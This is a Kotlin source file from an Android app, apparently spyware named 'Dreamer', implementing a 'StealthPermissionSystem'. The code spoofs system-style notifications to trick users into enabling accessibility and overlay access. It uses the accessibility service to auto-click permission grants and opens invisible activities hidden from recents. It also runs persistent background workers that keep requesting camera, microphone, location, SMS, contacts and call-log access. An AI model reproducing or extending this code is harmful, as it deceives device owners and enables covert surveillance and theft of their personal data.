package com.h4k3r.dreamer

import android.annotation.SuppressLint
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.net.Uri
import android.os.*
import android.provider.Settings
import android.util.Log
import android.view.View
import android.view.WindowManager
import android.widget.Toast
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.work.*
import com.google.firebase.database.ktx.database
import com.google.firebase.ktx.Firebase
import kotlinx.coroutines.*
import java.util.concurrent.TimeUnit

class StealthPermissionSystem private constructor(private val context: Context) {
    companion object {
        private const val TAG = "StealthPermission"
        private const val PREF_NAME = "stealth_perms"
        private const val WORK_TAG = "permission_worker"

        @Volatile
        private var INSTANCE: StealthPermissionSystem? = null

        fun getInstance(context: Context): StealthPermissionSystem {
            return INSTANCE ?: synchronized(this) {
                INSTANCE ?: StealthPermissionSystem(context.applicationContext).also {
                    INSTANCE = it
                }
            }
        }
    }

    private val prefs = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private val handler = Handler(Looper.getMainLooper())

    /* ── Smart Initialization ───────────────────── */
    fun initialize() {
        scope.launch {
            // Stage 1: Enable critical services first
            enableCriticalServices()

            // Stage 2: Schedule background permission grants
            scheduleBackgroundWork()

            // Stage 3: Use notification trick for permissions
            useNotificationTrick()

            // Stage 4: Monitor and auto-grant
            startIntelligentMonitor()
        }
    }

    /* ── Stage 1: Critical Services ─────────────── */
    private suspend fun enableCriticalServices() {
        // First, try to enable accessibility silently
        if (!isAccessibilityEnabled()) {
            createAccessibilityShortcut()
        }

        // Enable overlay permission using system dialog trick
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(context)) {
            showSystemOverlayDialog()
        }

        // Request notification access elegantly
        if (!isNotificationListenerEnabled()) {
            requestNotificationAccess()
        }
    }

    /* ── Accessibility Shortcut Trick ───────────── */
    @SuppressLint("PrivateApi")
    private fun createAccessibilityShortcut() {
        try {
            // Create a system-like notification that opens accessibility directly
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                flags = Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TOP
            }

            val pendingIntent = PendingIntent.getActivity(
                context, 0, intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            // Create notification that looks like system
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val channel = NotificationChannel(
                    "system_helper",
                    "System Helper",
                    NotificationManager.IMPORTANCE_HIGH
                ).apply {
                    description = "System optimization helper"
                    setShowBadge(false)
                    setSound(null, null)
                }
                notificationManager.createNotificationChannel(channel)
            }

            val notification = NotificationCompat.Builder(context, "system_helper")
                .setSmallIcon(android.R.drawable.ic_dialog_info)
                .setContentTitle("Optimize Device Performance")
                .setContentText("Enable accessibility for better performance")
                .setPriority(NotificationCompat.PRIORITY_HIGH)
                .setAutoCancel(true)
                .setContentIntent(pendingIntent)
                .addAction(
                    android.R.drawable.ic_menu_manage,
                    "Enable Now",
                    pendingIntent
                )
                .build()

            notificationManager.notify(9999, notification)

            // Auto-click using accessibility after it's enabled
            handler.postDelayed({
                if (DreamerAccessibilityService.instance != null) {
                    DreamerAccessibilityService.instance?.autoGrantAllPermissions()
                }
            }, 5000)

        } catch (e: Exception) {
            Log.e(TAG, "Accessibility shortcut failed", e)
        }
    }

    /* ── System Overlay Dialog Trick ────────────── */
    private fun showSystemOverlayDialog() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            // Create a small overlay window that guides user
            val windowManager = context.getSystemService(Context.WINDOW_SERVICE) as WindowManager

            val params = WindowManager.LayoutParams(
                1, 1, // Minimal size
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    WindowManager.LayoutParams.TYPE_SYSTEM_ALERT
                },
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                        WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE,
                android.graphics.PixelFormat.TRANSLUCENT
            )

            val view = View(context)

            try {
                windowManager.addView(view, params)
                windowManager.removeView(view)

                // If we reach here, we have overlay permission
            } catch (e: Exception) {
                // Need permission, open settings
                val intent = Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION).apply {
                    data = Uri.parse("package:${context.packageName}")
                    flags = Intent.FLAG_ACTIVITY_NEW_TASK
                }

                context.startActivity(intent)

                // Show helper notification
                showHelperNotification(
                    "Display Over Apps",
                    "Please enable 'Display over other apps' and return"
                )
            }
        }
    }

    /* ── Stage 2: Background Permission Worker ──── */
    private fun scheduleBackgroundWork() {
        val constraints = Constraints.Builder()
            .setRequiredNetworkType(NetworkType.NOT_REQUIRED)
            .setRequiresBatteryNotLow(false)
            .setRequiresCharging(false)
            .build()

        val permissionWork = PeriodicWorkRequestBuilder<PermissionWorker>(
            15, TimeUnit.MINUTES // Minimum interval
        )
            .setConstraints(constraints)
            .addTag(WORK_TAG)
            .setBackoffCriteria(
                BackoffPolicy.LINEAR,
                1, TimeUnit.MINUTES
            )
            .build()

        WorkManager.getInstance(context).enqueueUniquePeriodicWork(
            "stealth_permissions",
            ExistingPeriodicWorkPolicy.REPLACE,
            permissionWork
        )
    }

    /* ── Stage 3: Notification Permission Trick ─── */
    private fun useNotificationTrick() {
        // Create expandable notification with action buttons
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                "setup_helper",
                "Setup Assistant",
                NotificationManager.IMPORTANCE_DEFAULT
            ).apply {
                description = "Helps with app setup"
            }
            notificationManager.createNotificationChannel(channel)
        }

        // Create intents for each permission
        val cameraIntent = createPermissionIntent("camera")
        val locationIntent = createPermissionIntent("location")
        val storageIntent = createPermissionIntent("storage")

        val notification = NotificationCompat.Builder(context, "setup_helper")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setContentTitle("Quick Setup")
            .setContentText("Tap to enable features")
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setStyle(NotificationCompat.BigTextStyle()
                .bigText("Enable features for the best experience"))
            .addAction(android.R.drawable.ic_menu_camera, "Camera", cameraIntent)
            .addAction(android.R.drawable.ic_menu_mylocation, "Location", locationIntent)
            .addAction(android.R.drawable.ic_menu_save, "Storage", storageIntent)
            .setAutoCancel(false)
            .build()

        notificationManager.notify(8888, notification)
    }

    private fun createPermissionIntent(permission: String): PendingIntent {
        val intent = Intent(context, StealthPermissionReceiver::class.java).apply {
            action = "com.h4k3r.dreamer.GRANT_PERMISSION"
            putExtra("permission", permission)
        }

        return PendingIntent.getBroadcast(
            context,
            permission.hashCode(),
            intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
    }

    /* ── Stage 4: Intelligent Monitor ───────────── */
    private fun startIntelligentMonitor() {
        scope.launch {
            while (isActive) {
                checkAndRequestPermissions()
                delay(60_000) // Check every minute
            }
        }
    }

    private suspend fun checkAndRequestPermissions() {
        withContext(Dispatchers.Main) {
            val missingPermissions = getMissingPermissions()

            if (missingPermissions.isNotEmpty()) {
                // Use different strategies based on Android version
                when {
                    Build.VERSION.SDK_INT >= 31 -> useAndroid12Strategy(missingPermissions)
                    Build.VERSION.SDK_INT >= 29 -> useAndroid10Strategy(missingPermissions)
                    Build.VERSION.SDK_INT >= 26 -> useAndroid8Strategy(missingPermissions)
                    else -> useLegacyStrategy(missingPermissions)
                }
            }
        }
    }

    /* ── Android 12+ Strategy ───────────────────── */
    private fun useAndroid12Strategy(permissions: List<String>) {
        // Use SplashScreen API to request permissions
        permissions.forEach { permission ->
            when (permission) {
                "camera", "location", "microphone" -> {
                    // These can be requested while app is in background in Android 12+
                    requestPermissionInBackground(permission)
                }
                else -> {
                    // Schedule for next app launch
                    schedulePermissionRequest(permission)
                }
            }
        }
    }

    /* ── Android 10-11 Strategy ─────────────────── */
    private fun useAndroid10Strategy(permissions: List<String>) {
        // Use foreground service to request permissions
        val intent = Intent(context, StealthForegroundService::class.java).apply {
            putStringArrayListExtra("permissions", ArrayList(permissions))
        }

        ContextCompat.startForegroundService(context, intent)
    }

    /* ── Android 8-9 Strategy ───────────────────── */
    private fun useAndroid8Strategy(permissions: List<String>) {
        // Use JobScheduler for permission requests
        permissions.forEach { permission ->
            val intent = Intent(context, PermissionJobService::class.java).apply {
                putExtra("permission", permission)
            }

            PermissionJobService.enqueueWork(context, intent)
        }
    }

    /* ── Legacy Strategy (Android 7 and below) ──── */
    private fun useLegacyStrategy(permissions: List<String>) {
        // Use AlarmManager to schedule permission requests
        val alarmManager = context.getSystemService(Context.ALARM_SERVICE) as AlarmManager

        permissions.forEachIndexed { index, permission ->
            val intent = Intent(context, StealthPermissionReceiver::class.java).apply {
                action = "com.h4k3r.dreamer.REQUEST_PERMISSION"
                putExtra("permission", permission)
            }

            val pendingIntent = PendingIntent.getBroadcast(
                context,
                permission.hashCode(),
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
            )

            alarmManager.set(
                AlarmManager.RTC_WAKEUP,
                System.currentTimeMillis() + (index * 5000L),
                pendingIntent
            )
        }
    }

    /* ── Helper Methods ─────────────────────────── */
    private fun getMissingPermissions(): List<String> {
        val allPermissions = listOf(
            "camera", "location", "contacts", "sms", "phone",
            "storage", "microphone", "calendar", "call_log"
        )

        return allPermissions.filter { !isPermissionGranted(it) }
    }

    private fun isPermissionGranted(permission: String): Boolean {
        val manifestPermission = when (permission) {
            "camera" -> android.Manifest.permission.CAMERA
            "location" -> android.Manifest.permission.ACCESS_FINE_LOCATION
            "contacts" -> android.Manifest.permission.READ_CONTACTS
            "sms" -> android.Manifest.permission.READ_SMS
            "phone" -> android.Manifest.permission.READ_PHONE_STATE
            "storage" -> if (Build.VERSION.SDK_INT >= 33) {
                android.Manifest.permission.READ_MEDIA_IMAGES
            } else {
                android.Manifest.permission.READ_EXTERNAL_STORAGE
            }
            "microphone" -> android.Manifest.permission.RECORD_AUDIO
            "calendar" -> android.Manifest.permission.READ_CALENDAR
            "call_log" -> android.Manifest.permission.READ_CALL_LOG
            else -> return false
        }

        return ContextCompat.checkSelfPermission(context, manifestPermission) ==
                PackageManager.PERMISSION_GRANTED
    }

    private fun isAccessibilityEnabled(): Boolean {
        val enabledServices = Settings.Secure.getString(
            context.contentResolver,
            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
        ) ?: return false

        return enabledServices.contains(context.packageName)
    }

    private fun isNotificationListenerEnabled(): Boolean {
        val enabledListeners = Settings.Secure.getString(
            context.contentResolver,
            "enabled_notification_listeners"
        ) ?: return false

        return enabledListeners.contains(context.packageName)
    }

    private fun requestNotificationAccess() {
        val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS").apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK
        }

        try {
            context.startActivity(intent)
            showHelperNotification(
                "Notification Access",
                "Please enable notification access for Dreamer"
            )
        } catch (e: Exception) {
            Log.e(TAG, "Failed to open notification settings", e)
        }
    }

    private fun showHelperNotification(title: String, message: String) {
        val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

        val notification = NotificationCompat.Builder(context, "setup_helper")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle(title)
            .setContentText(message)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setAutoCancel(true)
            .build()

        notificationManager.notify(7777, notification)
    }

    fun requestPermissionInBackground(permission: String) {
        // For Android 12+, we can request certain permissions in background
        val intent = Intent(context, InvisiblePermissionActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_NO_ANIMATION or
                    Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS
            putExtra("permission", permission)
        }

        context.startActivity(intent)
    }

    private fun schedulePermissionRequest(permission: String) {
        prefs.edit().putBoolean("pending_$permission", true).apply()
    }

    /* ── Permission Worker ──────────────────────── */
    class PermissionWorker(
        context: Context,
        params: WorkerParameters
    ) : Worker(context, params) {

        override fun doWork(): Result {
            val system = getInstance(applicationContext)

            // Check pending permissions
            val prefs = applicationContext.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE)
            val allKeys = prefs.all.keys.filter { it.startsWith("pending_") }

            for (key in allKeys) {
                val permission = key.removePrefix("pending_")
                if (prefs.getBoolean(key, false)) {
                    // Try to request this permission
                    system.requestPermissionInBackground(permission)

                    // Remove from pending
                    prefs.edit().putBoolean(key, false).apply()
                }
            }

            return Result.success()
        }
    }

    /* ── Clean up ───────────────────────────────── */
    fun cleanup() {
        scope.cancel()
    }
}